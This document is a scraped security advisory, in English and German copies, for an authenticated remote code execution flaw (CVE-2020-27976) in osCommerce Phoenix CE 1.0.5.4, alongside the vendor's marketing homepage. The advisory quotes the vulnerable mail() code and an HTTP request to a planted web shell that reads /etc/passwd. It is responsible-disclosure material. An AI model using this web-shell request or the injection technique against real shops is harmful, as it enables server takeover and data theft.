=== Content from herolab.usd.de_a6453d2a_20250119_134919.html ===

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg "usd HeroLab Logo hell nebeneinander")](https://herolab.usd.de/en/)

* [About Us](https://herolab.usd.de/en/about-us/)
  + [The Way We Work](https://herolab.usd.de/en/the-way-we-work/)
  + [Our Experts](https://herolab.usd.de/en/our-experts/)
  + [Our Services](https://www.usd.de/en/security-analysis-pentests/)
  + [Our Platforms and Tools](https://herolab.usd.de/en/our-platforms-and-tools/)
* [Security Research](https://herolab.usd.de/en/security-research/)
  + [Our Commitment](/en/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/en/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/en/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/en/labnews/)
* [Meet the Team](https://herolab.usd.de/en/meet-the-team/)
* [usd AG](https://www.usd.de/en/)
* [Deutsch](https://herolab.usd.de/security-advisories/usd-2020-0026/ "Deutsch")

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg)](https://herolab.usd.de/en/)

* [About Us](https://herolab.usd.de/en/about-us/)
  + [The Way We Work](https://herolab.usd.de/en/the-way-we-work/)
  + [Our Experts](https://herolab.usd.de/en/our-experts/)
  + [Our Services](https://www.usd.de/en/security-analysis-pentests/)
  + [Our Platforms and Tools](https://herolab.usd.de/en/our-platforms-and-tools/)
* [Security Research](https://herolab.usd.de/en/security-research/)
  + [Our Commitment](/en/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/en/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/en/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/en/labnews/)
* [Meet the Team](https://herolab.usd.de/en/meet-the-team/)
* [usd AG](https://www.usd.de/en/)
* [Deutsch](https://herolab.usd.de/security-advisories/usd-2020-0026/ "Deutsch")

# usd-2020-0026 | OScommerce Phoenix CE

**Advisory ID**: usd-2020-0026
**CVE Number**: CVE-2020-27976
**Affected Product**: OScommerce Phoenix CE
**Affected Version**: 1.0.5.4
**Vulnerability Type**: Authenticated RCE
**Security Risk**: High
**Vendor URL**: <https://www.oscommerce.com/>
**Vendor Status**: Not fixed

###

### Description

A vulnerability has been discovered in the admin area of the oscommerce Phoenix CE in version 1.0.5.4 that leads to Remote Code Execution. The application allows to send mails to all customers. Due to insufficient filtering and misuse of the php mail function, an attacker may be able to execute arbitrary code on the system.

### Proof of Concept (PoC)

A vulnerability has been discovered in the admin area of the oscommerce Phoenix CE in version 1.0.5.4 that allows RCE. The application allows to send mails to all customers. Due to insufficient filtering and misuse of the php mail function, an attacker may be able to execute arbitrary code on the system.

Within `admin/mail.php` file a `from` POST parameter can be passed to the application. Afterwards the `send` function is called.

$from = tep\_db\_prepare\_input($\_POST['from']);

$subject = tep\_db\_prepare\_input($\_POST['subject']);

$message = tep\_db\_prepare\_input($\_POST['message']);

//Let's build a message object using the email class

$mimemessage = new email();

$mimemessage->add\_message($message);

$mimemessage->build\_message();

while ($mail = tep\_db\_fetch\_array($mail\_query))

{

$mimemessage->send($customer\_data- >get('name', $mail), $customer\_data-

>get('email\_address', $mail), '', $from, $subject);

}

In the `includes/system/versioned/1.0.5.4/email.php` file, the parameter `from` is passed to the php `mail`as the fifth parameter. This function executes `sendmail` command on the system-level. The idea is to pass a custom `from` header to the sendmail program via the -f option.

public function send($to\_name, $to\_addr, $from\_name, $from\_addr, $subject = '', $headers = []) {

[...]

return mail($to, $subject, $this->output, implode($this->lf, $headers), "-f$from\_addr");

Such an attack would look like the following:

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-2020-0026.png "usd-2020-0026")

This command adds a file `/var/www/html/phoenix/shell.php` which contains the following php code:

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-2020-0026-II.png "usd-2020-0026-II")

An attacker could then send the following request to execute arbitrary code. In this case displaying the `/etc/passwd` file.

```
GET /phoenix/shell.php?cmd=cat%20/etc/passwd HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

### Fix

Carefully examine the arguments of each call of the mail() function in your application and filter all user input.

###

### Timeline

* 2020-03-18 Vulnerability discovered
* 2020-03-20 First contact attempt
* 2020-03-27 Advisory send to vendor
* 2020-06-04 Request for update from vendor – no response
* 2020-06-25 Request for update from vendor – no response
* 2020-07-30 Request for update from vendor – no response
* 2020-10-20 Request for update from vendor – no response
* 2020-10-27 Security advisory released

###

### Credits

This security vulnerabilities were found by Gerbert Roitburd of usd AG.

### About usd Security Advisories

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/icon-hero.png "icon-hero")

In order to protect businesses against hackers and criminals, we always have to keep our skills and knowledge up to date. Thus, security research is just as important for our work as is building up a security community to promote the exchange of knowledge. After all, more security can only be achieved if many individuals take on the task.

Our [CST Academy](https://www.usd.de/en/cst-academy/) and our [usd HeroLab](https://herolab.usd.de/en/) are essential parts of our security mission. We share the knowledge we gain in our practical work and our research through training courses and publications. In this context, the [usd HeroLab](https://herolab.usd.de/en/) publishes a series of papers on new vulnerabilities and current security issues.

Always for the sake of our mission: „more security.“

[to usd AG](https://www.usd.de/)

In accordance with usd AG’s [Responsible Disclosure Policy](/en/responsible-disclosure/), all vendors have been notified of the existence of these vulnerabilities.

##

### Disclaimer

The information provided in this security advisory is provided „as is“ and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible.

#### usd HeroLab

#### [Contact](https://www.usd.de/en/contact/)

[Imprint](https://www.usd.de/en/imprint/)

[Privacy Protection](https://www.usd.de/en/privacy-protection/)

[General Terms and Conditions](https://www.usd.de/en/terms-conditions/)

© 2025 usd AG

#### Follow Us

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-github.svg)](https://github.com/usdAG/)    [![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-reddit.svg)](https://www.reddit.com/user/usdAG/?rdt=60932)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-youtube.svg)](https://www.youtube.com/c/usdAG)

[![](https://www.usd.de/wp-content/uploads/usd-social-media-mastodon.svg)](https://infosec.exchange/%40usdAG)[![](https://www.usd.de/wp-content/uploads/usd-social-media-meetup.svg)](https://www.meetup.com/de-DE/Cyber-Security-Transformation-Academy/?_locale=de-DE)     [![](https://www.usd.de/wp-content/uploads/usd-social-media-linkedin.svg)](https://www.linkedin.com/showcase/usd-ag-international/)

[Report a vulnerability or bug](https://www.usd.de/en/report-a-vulnerability-or-bug/)

[Code of Ethics](/en/code-of-ethics/)

#### LabNews

## [From Unicode to Exploit: The Security Risks of Overlong UTF-8 Encodings](https://herolab.usd.de/en/the-security-risks-of-overlong-utf-8-encodings/)

Sep 6, 2024

Written by Dominique Dittert, Senior Security Consultant, usd HeroLab In the dynamic field of cybersecurity, it is often the obscure and long-forgotten vulnerabilities that pose a hidden threat to otherwise hardened systems. One such vulnerability lies in invalid...

## [Security Advisories on hugocms and Gitea](https://herolab.usd.de/en/security-advisories-on-hugocms-and-gitea/)

Jul 25, 2024

The pentest professionals at usd HeroLab examined hugocms and Gitea during their pentests. Thereby, several vulnerabilities were identified. The vulnerabilities were reported to the vendors as part of the Responsible Disclosure Policy. The usd HeroLab Advisories can...

## [Security Advisory on AXIS Webcam](https://herolab.usd.de/en/security-advisory-on-axis-webcam/)

Jul 1, 2024

The pentest professionals at usd HeroLab examined the AXIS Webcam (P1364) during their pentests. Our professionals discovered a vulnerability (cross-site request forgery) in the admin panel of AXIS P1364 Webcam. Exploiting this vulnerability enables an attacker to...



=== Content from www.oscommerce.com_61200e84_20250119_134917.html ===


[![app](/themes/oscommerce/img/app-oscommerce-icon.svg)app shop](https://www.oscommerce.com/app)
![osCommerce LTD](/themes/oscommerce/img/logo-3.png)
[![](/themes/oscommerce/img/app_shop_logo.webp)](https://www.oscommerce.com/app)

| * osCommerce 4   + [osCommerce 4](https://www.oscommerce.com/products)     - [Free Trial](https://www.oscommerce.com/host-with-oscommerce)     - [Download osCommerce 4](https://www.oscommerce.com/download-oscommerce)     - [Ecommerce products](https://demo.oscommerce.com)     - [Dev kits](https://www.oscommerce.com/premium-app-packages-page)     - [Enterprise version](https://www.oscommerce.com/oscommerce-enterprise)   + [App Shop](https://www.oscommerce.com/app)     - [Design](https://www.oscommerce.com/app/design)     - [Marketing](https://www.oscommerce.com/app/marketing)     - [SEO tools](https://www.oscommerce.com/app/seo-tools)     - [Payment](https://www.oscommerce.com/app/payment)     - [Shipping](https://www.oscommerce.com/app/shipping-modules)     - [Retail pack](https://www.oscommerce.com/app/oscommerce-retail-pack)     - [Wholesale /B2b pack](https://www.oscommerce.com/app/oscommerce-wholesale-pack)     - [Marketplaces](https://www.oscommerce.com/app/marketplaces)     - Submit app     - Request app   + [Support](https://www.oscommerce.com/support)     - [Feature list](https://www.oscommerce.com/wiki/index.php?title=OsCommerce_Feature_List)     - [Documentation](https://www.oscommerce.com/wiki/)     - [Public Chat](https://www.oscommerce.com/public-chat)     - [Partners](https://www.oscommerce.com/partners)     - [Bug Reports](https://github.com/osCommerce/osCommerce-V4/issues)   + [Services](https://www.oscommerce.com/services)     - [Ecommerce development](https://www.oscommerce.com/ecommerce-development)     - [Migration to osCommerce](https://www.oscommerce.com/migration-to-oscommerce)     - [osCommerce hosting](https://www.oscommerce.com/oscommerce-hosting)     - [Enterprise services](https://www.oscommerce.com/enterprise-oscommerce)     - [White label Ecommerce](https://www.oscommerce.com/white-label-ecommerce)   + [App Shop](https://www.oscommerce.com/app)     - [Retail pack](https://www.oscommerce.com/app/oscommerce-retail-pack)     - [Wholesale /B2b pack](https://www.oscommerce.com/app/oscommerce-wholesale-pack)     - [Marketplaces](https://www.oscommerce.com/app/marketplaces)     - [Submit app](https://www.oscommerce.com/app)     - [Request app](https://www.oscommerce.com/app)   + [Us](https://www.oscommerce.com/us)     - [The Team](https://www.oscommerce.com/the-team)     - [News](https://www.oscommerce.com/blog)     - [Legal Policies](https://www.oscommerce.com/legal-policies)     - [For Investors](https://www.oscommerce.com/for-investors)     - [Live Shops](https://trends.builtwith.com/shop/osCommerce) |
| --- |

[Forum](https://www.oscommerce.com/forums/)

| * osCommerce 4   + [osCommerce 4](https://www.oscommerce.com/products)     - [Free Trial](https://www.oscommerce.com/host-with-oscommerce)     - [Download osCommerce 4](https://www.oscommerce.com/download-oscommerce)     - [Ecommerce products](https://demo.oscommerce.com)     - [Dev kits](https://www.oscommerce.com/premium-app-packages-page)     - [Enterprise version](https://www.oscommerce.com/oscommerce-enterprise)   + [App Shop](https://www.oscommerce.com/app)     - [Design](https://www.oscommerce.com/app/design)     - [Marketing](https://www.oscommerce.com/app/marketing)     - [SEO tools](https://www.oscommerce.com/app/seo-tools)     - [Payment](https://www.oscommerce.com/app/payment)     - [Shipping](https://www.oscommerce.com/app/shipping-modules)     - [Retail pack](https://www.oscommerce.com/app/oscommerce-retail-pack)     - [Wholesale /B2b pack](https://www.oscommerce.com/app/oscommerce-wholesale-pack)     - [Marketplaces](https://www.oscommerce.com/app/marketplaces)     - Submit app     - Request app   + [Support](https://www.oscommerce.com/support)     - [Feature list](https://www.oscommerce.com/wiki/index.php?title=OsCommerce_Feature_List)     - [Documentation](https://www.oscommerce.com/wiki/)     - [Public Chat](https://www.oscommerce.com/public-chat)     - [Partners](https://www.oscommerce.com/partners)     - [Bug Reports](https://github.com/osCommerce/osCommerce-V4/issues)   + [Services](https://www.oscommerce.com/services)     - [Ecommerce development](https://www.oscommerce.com/ecommerce-development)     - [Migration to osCommerce](https://www.oscommerce.com/migration-to-oscommerce)     - [osCommerce hosting](https://www.oscommerce.com/oscommerce-hosting)     - [Enterprise services](https://www.oscommerce.com/enterprise-oscommerce)     - [White label Ecommerce](https://www.oscommerce.com/white-label-ecommerce)   + [App Shop](https://www.oscommerce.com/app)     - [Retail pack](https://www.oscommerce.com/app/oscommerce-retail-pack)     - [Wholesale /B2b pack](https://www.oscommerce.com/app/oscommerce-wholesale-pack)     - [Marketplaces](https://www.oscommerce.com/app/marketplaces)     - [Submit app](https://www.oscommerce.com/app)     - [Request app](https://www.oscommerce.com/app)   + [Us](https://www.oscommerce.com/us)     - [The Team](https://www.oscommerce.com/the-team)     - [News](https://www.oscommerce.com/blog)     - [Legal Policies](https://www.oscommerce.com/legal-policies)     - [For Investors](https://www.oscommerce.com/for-investors)     - [Live Shops](https://trends.builtwith.com/shop/osCommerce) |
| --- |

| * [Checkout](https://www.oscommerce.com/app/checkout) * [My oscommerce](https://www.oscommerce.com/account/) * [Contact Us](https://www.oscommerce.com/contact) * [Github](https://github.com/osCommerce/osCommerce-V4) * [Get in touch](https://www.oscommerce.com/book-consultation) |
| --- |

 [facebook](https://www.facebook.com/pages/osCommerce/33387373079)
 [twitter](https://twitter.com/osCommerce)
[list](https://oscommerce.us1.list-manage.com/subscribe?u=8034c4fa2bcb139b4fc4861cd&id=b428c4d027)
[github](https://github.com/osCommerce/osCommerce-V4)
[youtube](https://www.youtube.com/%40osCommerceltd)

![](/images/banners/110/oscommerce-paypal-index.webp "New PayPal 2.0 module")

New PayPal 2.0 module

for osCommerce has arrived

[![](/images/paypal.png)](paypal-provider)
[Learn more](paypal-provider)

![](/images/banners/111/opayo-banner-1.webp "New Opayo gateway module")

New Opayo gateway module

for osCommerce has arrived

![](/images/el.png)
[Learn more](secure-payments-from-opayo)

[![](/images/banners/112/banner-2000x78.webp "Offer AI")](https://oscommerce.us1.list-manage.com/subscribe?u=8034c4fa2bcb139b4fc4861cd&id=b428c4d027)

FREE
# Open Source shopping cart

## Start selling online

with osCommerce - your one stop free
## open source eCommerce

platform - and add apps to your shopping cart as your online store grows and grows[![](/themes/oscommerce/img/download.webp) Download your FREE
## Shopping Cart](/download-file)
[![](/themes/dev_oscommerce/img/host_with_osCommerce_icon.svg)
## Try with osCommerce

host](/host-with-oscommerce#content)
In 2025 your eCommerce platform needs to use the latest server technology. That’s why osCommerce uses PHP 8.3 (but of course we still support older versions, starting from php 7.4)  and Maria DB 10.x to offer the fastest and most
##### secure performance

for ultimate speed and security. osCommerce will always develop for compatibility with the latest and best versions of server software ensuring your eCommerce shopping cart is always
##### fast, safe and secure.

[![demo](/themes/oscommerce/img/button.webp)osCommerce -
## Ecommerce platform

Demo](https://demo.oscommerce.com/)
 **osCommerce V4**1,180 add-ons\*
[183  live sites](/see-usage-of-community-version-of-oscommerce-v4)
[1,729  historical sites](/see-historical-usage-of-community-version-of-oscommerce-v4)
314,918  members\*\*
1.7 Mill.  forum postings **Historical: 2000 - 2022** ![](/themes/oscommerce/img/hist1.webp)9,169 add-ons
![](/themes/oscommerce/img/hist3.webp)[50,106 live sites](https://trends.builtwith.com/shop/osCommerce)
![](/themes/oscommerce/img/hist4.webp)[206,346  historical sites](https://trends.builtwith.com/shop/osCommerce)
![](/themes/oscommerce/img/hist5.webp)356,607 members
![](/themes/oscommerce/img/hist2.webp)1.7 Mill.  forum postings

we  do  our  best  to  support  the same amount of add-ons like in the versions  below v4. However there will be fewer of them as the current system is much more advanced out-of-the-box

 we have cleared the DB and removed non-existing e-mails and users 120 members are active on the forum,
right now. [Come in and say hi!](https://www.oscommerce.com/forums/)
### Big brands trust osCommerce

osCommerce offers the same
#### modern Ecommerce technology

that runs successful global multi-million and multi-billion businesses. As
## [Enterprise osCommerce](/enterprise-oscommerce)

version (Powerful Commerce) we work with: Samsung, Guinness World Records, Nicky Clarke, Zanussi and many more
![](/images/banners/105/history.webp "History")

### Discover osCommerce

![Shopping cart for businesses](/themes/oscommerce/img/shopping_cart_for_businesses.svg) [Shopping cart for businesses](/shopping-cart-for-businesses)
## Shopping cart for businesses

* ###### World’s 1st shopping cart

  selling online since 2000
* Free eCommerce shopping cart
* You own and control it
* Modern technology and GDPR compliant
* Super fast website & page performance
* Zero (0%) platform payment processing fees
* Mobile and SEO friendly
* Safe and secure
![Ecommerce for designers and developers](/themes/oscommerce/img/ecommerce_for_designers.svg)[Ecommerce for designers and developers](/ecommerce-for-designers-and-developers)
### Ecommerce for designers and developers

* Documented
  #### open source code

  with powerful API
* Supported, maintained, and upgraded according to our steady road map
* Earn by creating and selling Apps, and
  #### Design templates

  in the App store
* ##### Design and development partner services
* Project opportunities (for partners)
* ###### White label

  and co-branding options (for partners)
* Support with presentations and quotations (for partners)
* ###### Compatible with the latest versions of PHP and mySQL
osCommerce
### Shop Owner & Developer Community

Join our 300,000-strong
#### osCommerce community

to receive or give
#### eCommerce platform advice

, discuss apps & your shopping cart, order or create custom designs & development pieces
## osCommerce App Store

Get FREE and paid supported apps (and design themes) to help your business & eCommerce store grow. Or register as a developer to start earning by creating osCommerce apps & designs to help other
##### online shop owners

!![osCommerce Retail App pack](/themes/oscommerce/img/osCommerceRetailApp pack.svg)[osCommerce Retail App pack](/osc-v4-retail-app-pack)
### OSC V4 Retail App pack

1,180 apps!
Add osCommerce-made apps to your osCommerce online store to get access to the same game-changing technology that empowers online commerce for some of the world’s most-recognised brands ![OSC V4 Wholesale App pack](/themes/oscommerce/img/osCommerceWholesaleApppack.svg)[osCommerce Wholesale App pack](/osc-v4-wholesale-app-pack)
### OSC V4 Wholesale App pack

1,180 apps!
Extend osCommerce with wholesale (trade) functionality for distributors and manufacturers. Automate processes, simplify customer onboarding and credit control, enable special prices and payment solutions, create co-branded eCommerce shops, and more.
![osCommerce Enterprise Pack](/themes/oscommerce/img/osCommerceEnterprisePack.svg) [osCommerce Enterprise Pack](/osc-v4-enterprise-pack)
### OSC V4 Enterprise Pack

1,180 apps!
Get the instant power of our online ERP-level platform, which includes ALL osCommerce-made apps from our App Store. Not just an eCommerce shopping cart, but a business management solution, with optional hosting, support, and maintenance for your peace of mind. Fully customisable by osCommerce & our development partners.
[Our
### Ecommerce News](/blog)
Recent posts
[post item](/blog/success-story-mastering-the-extension-generator-in-oscommerce)
[post image](/blog/success-story-mastering-the-extension-generator-in-oscommerce)

###### [Success Story: Mastering the Extension Generator in osCommerce](/blog/success-story-mastering-the-extension-generator-in-oscommerce)

January 17, 2025
Success Story: Mastering the Extension Generator in osCommerce ...

[Read more](/blog/success-story-mastering-the-extension-generator-in-oscommerce)

[post item](/blog/success-story-automating-product-imports-with-csv-and-xml-feeds)
[post image](/blog/success-story-automating-product-imports-with-csv-and-xml-feeds)

###### [Success Story: Automating Product Imports with CSV and XML Feeds](/blog/success-story-automating-product-imports-with-csv-and-xml-feeds)

January 15, 2025
Success Story: Automating Product Imports with CSV and XML Feeds ...

[Read more](/blog/success-story-automating-product-imports-with-csv-and-xml-feeds)

[post item](/blog/success-story-offering-free-shipping-for-specific-customer-groups)
[post image](/blog/success-story-offering-free-shipping-for-specific-customer-groups)

###### [Success Story: Offering Free Shipping for Specific Customer Groups](/blog/success-story-offering-free-shipping-for-specific-customer-groups)

January 13, 2025
Success Story: Offering Free Shipping for Specific Customer Groups ...

[Read more](/blog/success-story-offering-free-shipping-for-specific-customer-groups)

osCommerce ltd. Company No. 13192610 Old Station House, Station Approach, Swindon, SN1 3DU, Wiltshire, United Kingdom

© 1999 - 2025 osCommerce ltd [Legal Policies](/us%26legal)



=== Content from herolab.usd.de_28be4b31_20250119_120604.html ===

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg "usd HeroLab Logo hell nebeneinander")](https://herolab.usd.de/)

* [Über uns](https://herolab.usd.de/ueber-uns/)
  + [Wie wir arbeiten](https://herolab.usd.de/wie-wir-arbeiten/)
  + [Unsere Expert\*innen](https://herolab.usd.de/unsere-experten/)
  + [Unsere Leistungen](https://www.usd.de/security-analysis-pentests/)
  + [Unsere Plattformen und Tools](https://herolab.usd.de/unsere-plattformen-und-tools/)
* [Security Research](https://herolab.usd.de/security-research/)
  + [Unser Engagement](/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/labnews/)
* [Meet the Team](https://herolab.usd.de/meet-the-team/)
* [usd AG](http://www.usd.de)
* [English](https://herolab.usd.de/en/security-advisories/usd-2020-0026/ "English")

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg)](https://herolab.usd.de/)

* [Über uns](https://herolab.usd.de/ueber-uns/)
  + [Wie wir arbeiten](https://herolab.usd.de/wie-wir-arbeiten/)
  + [Unsere Expert\*innen](https://herolab.usd.de/unsere-experten/)
  + [Unsere Leistungen](https://www.usd.de/security-analysis-pentests/)
  + [Unsere Plattformen und Tools](https://herolab.usd.de/unsere-plattformen-und-tools/)
* [Security Research](https://herolab.usd.de/security-research/)
  + [Unser Engagement](/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/labnews/)
* [Meet the Team](https://herolab.usd.de/meet-the-team/)
* [usd AG](http://www.usd.de)
* [English](https://herolab.usd.de/en/security-advisories/usd-2020-0026/ "English")

# usd-2020-0026 | OScommerce Phoenix CE

**Advisory ID**: usd-2020-0026
**CVE Number**: CVE-2020-27976
**Affected Product**: OScommerce Phoenix CE
**Affected Version**: 1.0.5.4
**Vulnerability Type**: Authenticated RCE
**Security Risk**: High
**Vendor URL**: <https://www.oscommerce.com/>
**Vendor Status**: Not fixed

###

### Description

A vulnerability has been discovered in the admin area of the oscommerce Phoenix CE in version 1.0.5.4 that leads to Remote Code Execution. The application allows to send mails to all customers. Due to insufficient filtering and misuse of the php mail function, an attacker may be able to execute arbitrary code on the system.

### Proof of Concept (PoC)

A vulnerability has been discovered in the admin area of the oscommerce Phoenix CE in version 1.0.5.4 that allows RCE. The application allows to send mails to all customers. Due to insufficient filtering and misuse of the php mail function, an attacker may be able to execute arbitrary code on the system.

Within `admin/mail.php` file a `from` POST parameter can be passed to the application. Afterwards the `send` function is called.

$from = tep\_db\_prepare\_input($\_POST['from']);

$subject = tep\_db\_prepare\_input($\_POST['subject']);

$message = tep\_db\_prepare\_input($\_POST['message']);

//Let's build a message object using the email class

$mimemessage = new email();

$mimemessage->add\_message($message);

$mimemessage->build\_message();

while ($mail = tep\_db\_fetch\_array($mail\_query))

{

$mimemessage->send($customer\_data- >get('name', $mail), $customer\_data-

>get('email\_address', $mail), '', $from, $subject);

}

In the `includes/system/versioned/1.0.5.4/email.php` file, the parameter `from` is passed to the php `mail`as the fifth parameter. This function executes `sendmail` command on the system-level. The idea is to pass a custom `from` header to the sendmail program via the -f option.

public function send($to\_name, $to\_addr, $from\_name, $from\_addr, $subject = '', $headers = []) {

[...]

return mail($to, $subject, $this->output, implode($this->lf, $headers), "-f$from\_addr");

Such an attack would look like the following:

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-2020-0026.png "usd-2020-0026")

This command adds a file `/var/www/html/phoenix/shell.php` which contains the following php code:

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-2020-0026-II.png "usd-2020-0026-II")

An attacker could then send the following request to execute arbitrary code. In this case displaying the `/etc/passwd` file.

```
GET /phoenix/shell.php?cmd=cat%20/etc/passwd HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

### Fix

Carefully examine the arguments of each call of the mail() function in your application and filter all user input.

###

### Timeline

* 2020-03-18 Vulnerability discovered
* 2020-03-20 First contact attempt
* 2020-03-27 Advisory send to vendor
* 2020-06-04 Request for update from vendor – no response
* 2020-06-25 Request for update from vendor – no response
* 2020-07-30 Request for update from vendor – no response
* 2020-10-20 Request for update from vendor – no response
* 2020-10-27 Security advisory released

###

### Credits

This security vulnerabilities were found by Gerbert Roitburd of usd AG.

### About usd Security Advisories

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/icon-hero.png "icon-hero")

In order to protect businesses against hackers and criminals, we always have to keep our skills and knowledge up to date. Thus, security research is just as important for our work as is building up a security community to promote the exchange of knowledge. After all, more security can only be achieved if many individuals take on the task.

Our [CST Academy](https://www.usd.de/en/cst-academy/) and our [usd HeroLab](https://herolab.usd.de/en/) are essential parts of our security mission. We share the knowledge we gain in our practical work and our research through training courses and publications. In this context, the [usd HeroLab](https://herolab.usd.de/en/) publishes a series of papers on new vulnerabilities and current security issues.

Always for the sake of our mission: „more security.“

[to usd AG](https://www.usd.de/)

In accordance with usd AG’s [Responsible Disclosure Policy](/en/responsible-disclosure/), all vendors have been notified of the existence of these vulnerabilities.

##

### Disclaimer

The information provided in this security advisory is provided „as is“ and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible.

#### usd HeroLab

[Kontakt](https://www.usd.de/kontakt/)
[Impressum](https://www.usd.de/impressum/)
[Datenschutz](https://www.usd.de/datenschutz/)
[AGB](https://www.usd.de/allgemeine-geschaeftsbedingungen-beratung/)

© 2023 usd AG

#### LabNews

## [From Unicode to Exploit: The Security Risks of Overlong UTF-8 Encodings](https://herolab.usd.de/the-security-risks-of-overlong-utf-8-encodings/)

Sep. 6, 2024

Written by Dominique Dittert, Senior Security Consultant, usd HeroLab In the dynamic field of cybersecurity, it is often the obscure and long-forgotten vulnerabilities that pose a hidden threat to otherwise hardened systems. One such vulnerability lies in invalid...

## [Security Advisories zu hugocms und Gitea](https://herolab.usd.de/security-advisories-zu-hugocms-und-gitea/)

Juli 25, 2024

Die Pentest Professionals des usd HeroLabs haben während der Durchführung ihrer Pentests hugocms und Gitea untersucht. Dabei wurden mehrere Schwachstellen auf den verschiedenen Anwendungen identifiziert. Die Schwachstelle wurde dem Hersteller im Rahmen der Responsible...

## [Security Advisory zu AXIS Webcam](https://herolab.usd.de/security-advisory-zu-axis-webcam/)

Juli 1, 2024

Die Pentest Professionals des usd HeroLabs haben während der Durchführung ihrer Pentests die AXIS Webcam (P1364) untersucht. Unsere Professionals entdeckten eine Sicherheitslücke (Cross-Site Request Forgery) im Adminpanel der AXIS P1364 Webcam. Das Ausnutzen dieser...

#### Folgen Sie uns

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-github.svg)](https://github.com/usdAG/)    [![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-reddit.svg)](https://www.reddit.com/user/usdAG/?rdt=60932)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-youtube.svg)](https://www.youtube.com/c/usdAG)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-mastodon.svg)](https://infosec.exchange/%40usdAG)

[![](https://www.usd.de/wp-content/uploads/usd-social-media-x.svg)](https://twitter.com/usdAG)[![](https://www.usd.de/wp-content/uploads/usd-social-media-meetup.svg)](https://www.meetup.com/de-DE/Cyber-Security-Transformation-Academy/?_locale=de-DE)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-instagram.svg)](https://www.instagram.com/usdhero/)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-linkedin.svg)](https://www.linkedin.com/company/usdag/?originalSubdomain=de)

[Meldung einer Schwachstelle oder eines Bugs](https://www.usd.de/meldung-bug-oder-schwachstelle/)

[Code of Ethics](/code-of-ethics/)


